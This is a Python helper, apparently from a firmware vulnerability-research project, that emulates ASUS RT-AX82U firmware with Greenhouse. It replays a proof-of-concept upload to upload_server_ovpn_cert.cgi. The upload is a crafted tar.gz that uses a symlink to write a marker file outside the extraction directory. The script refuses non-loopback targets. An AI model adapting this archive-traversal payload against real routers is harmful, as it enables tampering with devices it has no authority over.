#!/usr/bin/env python3
"""Build/rehost RT-AX82U with Greenhouse and replay a localhost-only proof.

The proof archive can only target /tmp/friday-proof in an isolated emulator.
This helper deliberately refuses non-loopback HTTP targets.
"""

from __future__ import annotations

import argparse
import hashlib
import io
import json
import subprocess
import tarfile
import urllib.error
import urllib.parse
import urllib.request
import uuid
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
DEFAULT_FIRMWARE = ROOT / "known_firmware/firmware/ASUS_RT-AX82U/FW_RT-AX82U_300438825101.zip"
DEFAULT_OUTPUT = ROOT / "known_firmware/emulation/ASUS_RT-AX82U"
SOURCE_IMAGE = "friday-hacker-agent"
GREENHOUSE_IMAGE = "greenhouse:usenix-eval-jul2023"


def run(command: list[str]) -> None:
    subprocess.run(command, check=True)


def build_greenhouse() -> None:
    run([
        "docker", "run", "--rm",
        "--user", "root",
        "-v", "/var/run/docker.sock:/var/run/docker.sock",
        "--entrypoint", "/bin/bash", SOURCE_IMAGE,
        "-lc", "make -C /opt/greenhouse build",
    ])


def rehost(firmware: Path, output: Path, timeout_minutes: int, mode: str) -> None:
    firmware = firmware.resolve()
    output = output.resolve()
    if not firmware.is_file():
        raise SystemExit(f"firmware not found: {firmware}")
    output.mkdir(parents=True, exist_ok=True)
    digest = hashlib.sha256(firmware.read_bytes()).hexdigest()
    if mode == "single":
        greenhouse_command = (
            f"/root/venv/bin/python3 /gh/gh.py --outpath /gh/results/{digest} --workspace /tmp/scratch "
            f"--logpath=/patches/{digest}.log --cache_path=/cache --ip 172.21.0.2 "
            "--ports=80,81 --max_cycles=10 -nf -nd --brand=asus --rehost_type=HTTP "
            "--img_path=/input/firmware.zip"
        )
    else:
        greenhouse_command = "/gh/run.sh asus /input/firmware.zip"
    result = subprocess.run([
        "docker", "run", "--rm", "--privileged", "--network", "none",
        "-v", "/dev:/host/dev",
        "-v", "/lib/modules:/lib/modules:ro",
        "-v", f"{firmware}:/input/firmware.zip:ro",
        "-v", f"{output}:/export",
        "--entrypoint", "/bin/bash", GREENHOUSE_IMAGE,
        "-lc",
        "modprobe loop; test -c /dev/loop-control || mknod /dev/loop-control c 10 237; "
        "for i in $(seq 0 31); do test -b /dev/loop$i || mknod /dev/loop$i b 7 $i; done; "
        f"/gh/docker_init.sh && cd /gh && timeout --signal=INT --kill-after=30s {timeout_minutes}m "
        f"{greenhouse_command}; "
        "status=$?; cp -a /gh/results/. /export/ 2>/dev/null || true; "
        "mkdir -p /export/greenhouse-scratch; "
        "cp -a /tmp/scratch/. /export/greenhouse-scratch/ 2>/dev/null || true; "
        "exit $status",
    ])
    if result.returncode in {124, 137}:
        print(f"Greenhouse reached the {timeout_minutes}-minute bound; partial results were exported to {output}.")
    elif result.returncode:
        raise subprocess.CalledProcessError(result.returncode, result.args)


def proof_archive() -> bytes:
    payload = io.BytesIO()
    with tarfile.open(fileobj=payload, mode="w:gz") as archive:
        pivot = tarfile.TarInfo("pivot")
        pivot.type = tarfile.SYMTYPE
        pivot.linkname = "../friday-proof"
        archive.addfile(pivot)
        marker = b"FRIDAY_ASUS_HTTP_PROOF\n"
        member = tarfile.TarInfo("pivot/asus-http-marker")
        member.size = len(marker)
        archive.addfile(member, io.BytesIO(marker))
    return payload.getvalue()


def write_proof_archive(output: Path) -> None:
    """Write the bounded archive used by the isolated HTTP replay."""
    output = output.resolve()
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_bytes(proof_archive())
    print(json.dumps({
        "archive": str(output),
        "sha256": hashlib.sha256(output.read_bytes()).hexdigest(),
        "guest_prerequisite": "/tmp/friday-proof must already exist",
        "expected_marker": "/tmp/friday-proof/asus-http-marker",
    }, indent=2))


def replay(base_url: str, cookie: str | None) -> None:
    parsed = urllib.parse.urlparse(base_url)
    if parsed.hostname not in {"127.0.0.1", "localhost", "::1"}:
        raise SystemExit("refusing non-loopback target; expose the isolated emulator on localhost")
    boundary = "FRIDAY-" + uuid.uuid4().hex
    archive = proof_archive()
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="import_cert_file"; filename="proof.tgz"\r\n'
        "Content-Type: application/gzip\r\n\r\n"
    ).encode() + archive + f"\r\n--{boundary}--\r\n".encode()
    url = urllib.parse.urljoin(base_url.rstrip("/") + "/", "upload_server_ovpn_cert.cgi")
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body)),
        "User-Agent": "FRIDAY-local-validation/1.0",
    }
    if cookie:
        headers["Cookie"] = cookie
    request = urllib.request.Request(url, data=body, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            result = {"url": url, "status": response.status, "body": response.read(512).decode(errors="replace")}
    except urllib.error.HTTPError as exc:
        result = {"url": url, "status": exc.code, "body": exc.read(512).decode(errors="replace")}
    print(json.dumps(result, indent=2))
    print("Check the disposable guest for /tmp/friday-proof/asus-http-marker.")


def main() -> int:
    parser = argparse.ArgumentParser(description="Isolated RT-AX82U Greenhouse and HTTP validation helper")
    commands = parser.add_subparsers(dest="command", required=True)
    commands.add_parser("build-greenhouse", help="Build the bundled Greenhouse artifact image")
    archive = commands.add_parser("proof-archive", help="Write the bounded HTTP proof archive")
    archive.add_argument("--output", type=Path, required=True)
    gh = commands.add_parser("rehost", help="Rehost the firmware with Greenhouse without external networking")
    gh.add_argument("--firmware", type=Path, default=DEFAULT_FIRMWARE)
    gh.add_argument("--output", type=Path, default=DEFAULT_OUTPUT)
    gh.add_argument(
        "--timeout-minutes", type=int, default=45,
        help="Bound Greenhouse/FirmAE runtime and still export partial results (default: 45).",
    )
    gh.add_argument(
        "--mode", choices=("single", "full"), default="single",
        help="Use Greenhouse single-service patching by default; 'full' tries FirmAE first.",
    )
    probe = commands.add_parser("replay", help="Send a bounded proof to a localhost-only emulator")
    probe.add_argument("--base-url", required=True, help="For example http://127.0.0.1:8080")
    probe.add_argument("--cookie", help="Authenticated emulator session cookie")
    args = parser.parse_args()
    if args.command == "build-greenhouse":
        build_greenhouse()
    elif args.command == "proof-archive":
        write_proof_archive(args.output)
    elif args.command == "rehost":
        rehost(args.firmware, args.output, args.timeout_minutes, args.mode)
    else:
        replay(args.base_url, args.cookie)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
